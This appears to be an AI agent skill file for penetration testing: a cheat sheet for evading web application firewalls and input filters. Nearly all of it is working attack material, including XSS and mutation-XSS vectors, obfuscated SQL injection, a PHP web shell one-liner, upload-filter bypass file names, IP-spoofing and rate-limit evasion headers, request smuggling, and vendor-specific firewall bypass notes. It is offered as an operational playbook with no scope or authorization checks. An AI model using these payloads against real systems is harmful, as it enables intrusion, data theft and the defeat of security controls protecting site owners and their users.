---
name: waf-evasion-encoding-playbook
description: Low-to-advanced encoding cheat sheet for evading WAFs and input filters -- HTML/JS/CSS/unicode escapes, SQL whitespace/comment tricks, XSS event-handler and mXSS vectors, PHP upload-filter bypasses, path confusion, homoglyphs, chunked-smuggling-past-WAF, and per-vendor WAF quirks (AWS/Cloudflare/CRS/Azure/Imperva/Akamai). Converted from master-pentest-prompt.md Phase 21. Use when a payload is confirmed to work logically but gets blocked by a WAF or input filter -- this is the encoding-level escalation, distinct from the waf-bypass skill's request-level tiers (headers/path/method/HTTP-version).
---

# WAF evasion & encoding playbook (low -> advanced)

## When to use

A payload that's logically correct (would work if it reached the
backend unmodified) but gets blocked or stripped by a WAF/filter. This is
encoding-level evasion -- if the whole *request* is being blocked
regardless of payload content, use the `waf-bypass` skill's Tier 1-4
request-level bypasses (`waf-bypass-mcp`'s `attempt_bypass()` automates
those) first; this skill is for getting a specific payload past
content-inspection once the request itself is reaching the backend.

## HTML entities

`&#x3C;` `&#60;` `&#58;` `&#x270;` -- note the trailing semicolon is
often tolerated as optional by browsers even when a filter expects it.

## JS escapes

`<` `\x3c` `\x61lert` (per-character hex), octal `\154\157\143`,
`javascript:`.

## CSS escapes

`\00003C`.

## Unicode tricks

Fullwidth `＜＞／` (U+FF1C/FF1E/FF0F visually resemble `<>/`), overlong
UTF-8 encodings (`%c0%af`, `%e0%80%af`, `%c0%ae`..`%c0%af`), UTF-7
(`+ADw-script+AD4-`).

## SQL-specific

- **Whitespace substitutes**: `%09` `%0A` `%0B` (vertical tab) `%0C`
  `%0D` `%A0` (NBSP), or comment-as-whitespace `/**/`, or parens.
- **Comment splitting**: `UN/**/ION SE/**/LECT`, versioned MySQL
  comments `/*!50000UNION*/` `/*!12345*/`.
- **Hex/CHAR encoding**: `0x61646d696e`, `CHAR(97)`,
  `concat(0x22,@@version,0x3c69)`.
- **Mixed case + URL-encoded letters**: `%55NiOn(%53EleCt`,
  `UN%49ON SEL%45CT`.
- **Operator substitution**: `LIKE`, `REGEXP`, `BETWEEN`, `&&`, `||`,
  `1-0`, `'+0+'`, `-/-`, `1=1 LIMIT`.
- **Signature-splitting**: `uni*on sel*ect` when the filter replaces `*`
  with a space; double-encoded variant `%252f%252a*/union`.
- **Blind time-based**: `BENCHMARK(10000000,MD5(1))`,
  `DBMS_PIPE.RECEIVE_MESSAGE`, `pg_sleep`.

## XSS event handlers and mXSS

Less-common event handlers that filters may not blocklist: `onpageshow`,
`onpointerrawupdate`, `onauxclick`, `ontoggle`,
`<svg><animate onbegin>`, `<set attributeName>`, tab/space variants of
`onload`. mXSS (mutation XSS) vectors:
`<svg><style><img src=x onerror=alert(1)></style></svg>`, `<math><mtext>`,
`<title>`, `<listing>`, `noscript`/`foreignObject` context tricks.

## Call obfuscation

`` alert`1` `` (tagged template call), `eval(atob('...'))`,
`` Function`alert\x281\x29` ``, `onerror=alert;throw 1`.

## PHP-specific upload/RCE bypasses

`<?=`$_GET[0]`?>`, `<?=system(...)`, alternate extensions `.php3` `.pht`
`.phtml` `.phar` `.pgif`, null-byte-style `shell.php%00.png`, IIS
alternate-stream trick `shell.php;.jpg`, `shell.php::$DATA`, trailing
dot/space tricks, `.htaccess` `AddType` abuse, GIF89a magic bytes
prepended to PHP content (`GIF89a;<?php`).

## Path confusion

`/public/..;/manager` (Tomcat matrix-parameter trick), `//`, `%2f%2e%2e%2f`,
`/%61dmin` (encoded first letter), encoded slash variants `%2F` `%252F`
`%c0%af`, `X-Original-URL`/`X-Rewrite-URL` headers (the backend honors
these but the WAF in front of it usually doesn't inspect them),
`X-Forwarded-Proto`, `X-Forwarded-Host`, and IP-ACL-bypass headers
(`X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, `X-Originating-IP`,
`X-Custom-IP-Authorization`, `Forwarded: for=`).

## Rate-limit header spray

Rotate through `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`,
`True-Client-IP`, `CF-Connecting-IP`, `Fastly-Client-IP`,
`X-Cluster-Client-IP`, `Proxy-Client-IP`, `WL-Proxy-Client-IP`,
`X-Originating-IP`, `X-Remote-IP`, `Forwarded`, `Via`, `X-Forwarded-Host`.
Check whether the rate limiter parses the leftmost or rightmost IP in a
multi-value header, whether duplicate headers confuse it, and integer-IP
tricks: `0x7f.0x0.0x0.0x1`, `2130706433`, `127.1`.

## Double/triple encoding

`%2527` `%253C` `%252F`, `%252f%252a*/union`.

## Homoglyphs and invisible characters

Cyrillic `а` vs. Latin `a`, Greek `α`, fullwidth `ＣＬＩＥＮＴ`, Hangul
filler `U+3164` (renders invisible but is a valid JS identifier
character), bidi override characters `U+202A`-`U+202E` (the "Trojan
Source" class), zero-width space/non-joiner for keyword-breaking, tag
characters `U+E0000`+.

## Chunked smuggling past a WAF

Split the payload across chunk boundaries so no single chunk contains the
full flagged signature; `Content-Length: -1` can cause some
implementations to skip body inspection entirely.

## Per-WAF-vendor notes

- **AWS WAF**: double-encoding plus case variation tends to slip through.
- **Cloudflare**: obscure event handlers plus `atob()`-wrapped payloads.
- **OWASP CRS at Paranoia Level 1**: a single overlong UTF-8 sequence can
  slip past.
- **Azure/Imperva/Akamai**: hex encoding and homoglyph substitution are
  the more reliable classes against these.

## The oracle

Always diff the baseline blocked response (status code + body hash)
against each candidate variant's response -- a byte-identical block page
means the variant didn't change anything; any diff is worth investigating
even if the status code alone looks unchanged.
